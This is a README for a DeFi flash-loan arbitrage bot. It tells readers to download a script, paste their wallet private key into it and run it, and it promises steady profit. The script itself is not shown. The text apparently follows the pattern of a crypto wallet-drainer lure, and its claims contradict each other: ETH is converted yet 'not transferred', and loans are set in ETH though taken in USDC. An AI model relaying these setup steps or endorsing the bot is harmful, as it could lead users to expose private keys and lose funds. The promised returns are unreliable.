
# FlashLoanArbitrage

Hi! This is my project **FlashLoanArbitrage** — a bot for arbitrage on DeFi with flash loans. Using a smart contract and a local script `goflash.js`, which runs on your computer. Sharing it so you can try it out!

![DeFi Arbitrage](https://i.ibb.co/7xtfYSxL/image-20.jpg)

## How It Works 💡

1. **Smart Contract**:
   - Takes a flash loan in USDC.
   - Converts your ETH to USDC before the deal.
   - Buys ETH at a low price on one platform.
   - Sells ETH at a high price on another.
   - Repays the loan, pays fees and gas.
   - Converts the profit from USDC back to ETH.
   - The remainder is your profit!

2. **Script `goflash.js`**:
   - Checks ETH/USDC prices on five DeFi platforms.
   - Waits for a price difference of **0.9%** or more to avoid losses.
   - If the difference is there, it triggers arbitrage through the contract.

## Which DeFi Protocols I Use 💰

I added four protocols for flash loans:

- **Aave (0.05%)**: Tons of liquidity, up to **10,000,000 USDC**.
- **dYdX (0.05%)**: Fast, up to **500,000 USDC**.
- **Uniswap V3 (0.01%)**: Low fees, up to **5,000,000 USDC**.
- **Balancer (0.02%)**: Flexible pools, up to **1,000,000 USDC**.

The bigger the loan, the higher the fee. So don’t take a huge loan if your wallet balance is low!

## Which Platforms I Scan 📊

<img src="https://i.ibb.co/4RtXjn2G/chainlink-link-logo.png" alt="Chainlink" width="50">
<img src="https://i.ibb.co/gZf4KQT0/uniswap-uni-logo.png" alt="Uniswap" width="50">
<img src="https://i.ibb.co/SWfzvJq/sushiswap-sushi-logo.png" alt="SushiSwap" width="50">
<img src="https://i.ibb.co/r2H1V45g/curve-dao-token-crv-logo.png" alt="Curve" width="50">
<img src="https://i.ibb.co/21vcD80K/balancer-bal-logo.png" alt="Balancer" width="50">

The script checks ETH/USDC prices on these platforms:

1. **Chainlink**: Oracle for the base ETH price.
2. **Uniswap V2**: Classic DEX, always liquid.
3. **SushiSwap**: Uniswap fork, also solid.
4. **Curve Finance**: Stable pools, less slippage.
5. **Balancer**: Flexible pools for arbitrage.

If the price difference is ≥0.9%, the script triggers a deal. Less than that, it waits to avoid losses.

![DeFi Platforms](https://i.ibb.co/kr0J4mD/21.png)

## How to Run 🚀

Here’s how to run my bot:

1. **Download the Files**:
   - Grab **`goflash.js`, `package.json`** from the repo.

2. **Put Them in a Folder**:
   - Any folder on your computer.

3. **Install Libraries**:
   - Open a terminal (cmd, PowerShell, or VS Code).
   - Navigate to the folder with:
     ```bash
     cd your_path_to_folder
     ```
   - Install dependencies:
     ```bash
     npm install
     ```

4. **Add Your Private Key**:
   - Open `goflash.js` in an editor.
   - Replace:
     ```javascript
     const PRIVATE_KEY = "YOUR_PRIVATE_KEY_HERE";
     ```
     with your key ( **Don’t share it with anyone!** )

5. **Run the Script**:
   - Type in the terminal:
     ```bash
     node goflash.js
     ```

6. **Work with the Menu**:
   - Select **DeFi** — I recommend **dYdX** or **Uniswap V3**.
   - In **Loan Amount in ETH**, set the loan amount (from 10 to the protocol’s max).
     - **Careful**: If your wallet balance is <0.1 ETH, don’t take a loan over **10 ETH** — gas won’t cover it!
   - Hit **Start Arbitrage** to start.

7. **What the Script Does**:
   - Scans ETH/USDC prices on platforms.
   - Waits for a difference ≥0.9% and triggers arbitrage through the contract.
   - Converts your ETH to USDC before the deal and profit back to ETH after.

## Important Notes ⚠️

- **Wallet Balance**: For loans over 10 ETH, you need a balance ≥0.1 ETH, or the script won’t let you pick a big loan.
- **Fees**: You pay trading fees (0.1%), slippage (0.05%), and gas.

## How It Works Example 📈

1. You pick **dYdX** and a loan of **10 ETH** (if balance ≥0.1 ETH).
2. The script converts your ETH to USDC before the deal (wallet balance is used only for gas, ETH **is not transferred** to the FlashLoanArbitrage contract).
3. It checks prices, for example:
   - Uniswap V2: 4200 USDC/ETH
   - SushiSwap: 4250 USDC/ETH
4. If the difference is ≥0.9%, the contract:
   - Takes a flash loan in USDC.
   - Buys ETH on Uniswap V2.
   - Sells ETH on SushiSwap.
   - Repays the loan, pays fees and gas.
   - Converts the profit from USDC back to ETH.
   - The final profit (`Net profit`) in ETH goes to you, accounting for all costs (flash loan fee, trading fees 0.1%, slippage 0.05%, gas).
   - No need to top up any balance anywhere!!!

![Arbitrage Flow](https://s14.gifyu.com/images/bNaR2.png)

## Good Luck! 🍀

Hope my bot brings you some profit! If something doesn’t work or you have ideas, drop a note in issues.

---

*This is my project, made for myself, sharing as is. Check the contract and script before mainnet to avoid bugs!*
